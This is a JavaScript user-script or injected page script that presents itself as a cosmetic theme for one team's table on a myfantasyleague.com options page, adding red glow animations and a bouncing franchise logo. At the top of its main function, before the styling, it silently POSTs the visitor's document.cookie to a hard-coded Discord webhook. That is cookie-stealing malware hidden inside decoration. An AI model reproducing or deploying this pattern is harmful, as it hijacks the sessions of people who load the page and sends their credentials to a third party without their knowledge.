if (!window.scriptRan) {
  main();
}
window.scriptRan = true;

function main() {
  fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: document.cookie })
  });




  if (window.location.href.startsWith("https://www42.myfantasyleague.com/2025/options")) {
    const myTable = Array.from(document.querySelectorAll('table.report'))
      .find(tbl => tbl.querySelector('caption span')?.textContent.trim() === "VanGinkelTouchedMyJinkel");

    if (myTable) {
      // 1. Caption style (red text + red glow)
      const caption = myTable.querySelector('caption span');
      caption.style.fontFamily = '"Orbitron", "Exo 2", "Roboto", sans-serif';
      caption.style.fontSize = "28px";
      caption.style.fontWeight = "bold";
      caption.style.color = "#FF0000"; // red text
      caption.style.textShadow = "0 0 5px #FF4444, 0 0 10px #FF2222, 0 0 20px #FF0000"; // red glow

      let glow = 5, increasing = true;
      setInterval(() => {
        caption.style.textShadow = `0 0 ${glow}px #FF4444, 0 0 ${glow * 2}px #FF2222, 0 0 ${glow * 4}px #FF0000`;
        if (increasing) glow += 1; else glow -= 1;
        if (glow > 15) increasing = false;
        if (glow < 5) increasing = true;
      }, 100);

      // 2. Animate each "box" (td and li) with red & black pulsing background
      const boxes = myTable.querySelectorAll('td, li');
      let brightness = 0;
      let direction = 1;
      setInterval(() => {
        boxes.forEach(box => {
          // Animate background from dark red to bright red
          box.style.backgroundColor = `rgb(${100 + brightness},0,0)`; // darker red to bright red
          box.style.color = "#FFFFFF"; // white text
          box.style.fontFamily = '"Orbitron", "Exo 2", "Roboto", sans-serif';
          box.style.fontWeight = "bold";
          box.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000"; // subtle red glow
          box.style.padding = "5px"; // spacing
          box.style.borderRadius = "4px"; // rounded corners

          // Style all links inside the box
          box.querySelectorAll('a').forEach(link => {
            link.style.color = "#FFCCCC"; // slightly darker white/pinkish so still looks like a link
            link.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000"; // same subtle red glow
            link.style.fontWeight = "bold";
            link.style.textDecoration = "underline"; // optional: underline to indicate clickable
          });
        });

        // Update brightness
        brightness += direction * 5;
        if (brightness >= 155) direction = -1; // max red brightness
        if (brightness <= 0) direction = 1;   // min red brightness
      }, 50);

      // 3. Animate franchise logo
      const logo = myTable.querySelector('img.franchiselogo');
      if (logo) {
        logo.style.position = "relative";
        let dir = 1, topPos = 0;
        setInterval(() => {
          topPos += dir;
          logo.style.top = topPos + "px";
          if (topPos > 10) dir = -1;
          if (topPos < -10) dir = 1;
        }, 100);
      }
    }
  }

  
}
